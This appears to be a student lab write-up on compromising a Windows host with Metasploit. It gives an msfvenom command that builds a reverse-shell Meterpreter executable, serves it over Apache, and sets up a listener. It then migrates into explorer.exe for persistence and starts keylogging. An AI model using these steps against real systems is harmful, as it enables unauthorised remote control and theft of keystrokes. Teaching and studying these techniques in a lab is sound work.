# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

Find the attackers ip address using ifconfig

![1con](https://github.com/user-attachments/assets/0d25e9d9-c4b8-4ac8-ac9f-345b4ec13e00)

Create a malicious executable file fun.exe using msfvenom command

msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe

![2venom](https://github.com/user-attachments/assets/488fa0a4-6c42-491c-af54-2ce2a5b3cebc)

copy the fun.exe into the apache /var/www/html folder

![3cp](https://github.com/user-attachments/assets/8c032d11-68d5-4cc4-92c0-9cee47f59626)

Start apache server
sudo systemctl apache2 start

![4sys](https://github.com/user-attachments/assets/e63fed3e-ece1-49ed-bf4c-c51562e9821f)

Check the status of apache2

![5stat](https://github.com/user-attachments/assets/e0b4745e-2798-4a07-8cc6-04851015a04e)

Invoke msfconsole:

![6msfc](https://github.com/user-attachments/assets/64acdbd3-c086-4101-95b6-ce6e4d81b73b)

Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

![7help](https://github.com/user-attachments/assets/4e8232ee-33aa-4455-8a72-391b4eff3d01)


Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
exploit

![8](https://github.com/user-attachments/assets/39b60011-8a30-4c59-bab3-083e062e2632)

On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe
The file "fun.exe" downloads.

![8download](https://github.com/user-attachments/assets/a26d4eb4-dbc9-4a69-8328-a0fa2cfdf942)

Bypass any warning boxes, double-click the file, and allow it to run.

![9show](https://github.com/user-attachments/assets/8a60e1e0-626d-4d52-a331-18887ba75425)

On kali give the command exploit

![10com](https://github.com/user-attachments/assets/1218d326-1024-4702-83f1-8eac34ba66a4)

To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running 

![11sho](https://github.com/user-attachments/assets/472c76bb-f732-4508-9d82-92bcc8f7b255)

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe

![12mig](https://github.com/user-attachments/assets/39eab6b3-a07a-4412-8760-2de39ec788b7)

at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted

![13sho](https://github.com/user-attachments/assets/f7c48cdc-d11f-4515-b053-87173525947b)

Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.

![15keyscan](https://github.com/user-attachments/assets/ddfc16fa-9ae9-44dd-880f-7d15c2feb0c1)



## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
